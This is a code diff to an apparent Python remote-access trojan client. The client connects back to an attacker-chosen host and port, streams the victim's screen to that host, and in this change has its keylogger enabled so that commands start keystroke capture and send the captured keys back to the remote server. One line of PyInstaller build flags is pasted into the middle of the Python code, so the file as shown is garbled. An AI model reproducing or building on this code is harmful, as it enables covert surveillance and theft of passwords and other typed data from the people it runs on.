@@ -8,7 +8,7 @@ import data
 from mss import mss
 from threading import Thread
 from string import ascii_letters, digits
-#from keylogger.keylogger import Keylogger
+from keylogger.keylogger import Keylogger
 from vidstream import ScreenShareClient
 from time import sleep
 
@@ -18,8 +18,8 @@ class Client:
 		self.c_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.__lhost = LHOST
 		self.__lport = int(LPORT)
-		#self.klogger = Keylogger()
-		self.screen_share = ScreenShareClient(self.__lhost, 7777)
+		self.klogger = Keylogger()
+		self.screen_share = ScreenShareClient(self.__lhost, 8532)
 		self.__connect_to_server()
 
 
@@ -165,15 +165,15 @@ Processor: {uname.processor}
 
 			elif cmd[:11] == "chwallpaper":
 				self.__change_wallpaper(cmd[12:])
-		
+		 --hidden-import=pynput.keyboard._xorg --hidden-import=pynput.mouse._xorg --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32
 			elif cmd == "start_keycap":
-				#Thread(target=self.klogger.start_dumps).start()
+				Thread(target=self.klogger.start_dumps).start()
 				pass
 			elif cmd == "dump_keycap":
-				#self.__reliable_send(self.klogger.dump_keys())
+				self.__reliable_send(self.klogger.dump_keys())
 				pass
 			elif cmd == "stop_keycap":
-				#self.klogger.stop_dumps()
+				self.klogger.stop_dumps()
 				pass
 			elif cmd[:5] == "start":
 				try:
